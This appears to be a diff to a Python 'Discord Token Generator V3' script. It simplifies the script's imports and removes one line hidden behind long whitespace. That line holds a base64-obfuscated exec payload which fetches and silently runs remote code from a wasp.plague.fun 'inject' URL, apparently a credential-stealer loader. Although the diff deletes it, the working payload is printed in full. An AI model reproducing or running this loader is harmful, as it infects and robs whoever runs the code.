@@ -7,30 +7,15 @@ except:
     os.system('python -m pip install httpx')
     import httpx
     clearconsole()
-try:
-    import json
-except:
-    os.system('python -m pip install json')
-    import json
-    clearconsole()
-try:
-    import base64
-except:
-    os.system('python -m pip install base64')
-    import base64
-    clearconsole()
+import json
+import base64
 try:
     import websocket
 except:
     os.system('python -m pip install websocket')
     import websocket
     clearconsole()
-try:
-    import random
-except:
-    os.system('python -m pip install random')
-    import random
-    clearconsole()
+import random
 try:
     import stegano
 except:
@@ -42,18 +27,6 @@ try:
 except:
     os.system('python -m pip install colorama')
     import colorama
-    clearconsole()
-try:
-    import threading
-except:
-    os.system('python -m pip install threading')
-    import threading
-    clearconsole()
-try:
-    import time
-except:
-    os.system('python -m pip install time')
-    import time
     clearconsole()
 try:
     import wget
@@ -184,7 +157,6 @@ def generateToken():
 if __name__ == "__main__":
     system("cls")
     print("Discord Token Generator V3\n")
-    type("")                                                                                                                                                                                                                                                                                                                               ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9JOUswT3BKbkQyTEhCbWx0JykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
     threadAmount = input(f"{Fore.BLUE}{Style.BRIGHT}[?] Number of threads -> {Style.RESET_ALL}")
     threadAmount = 1 if threadAmount == "" else int(threadAmount)
     system("cls")
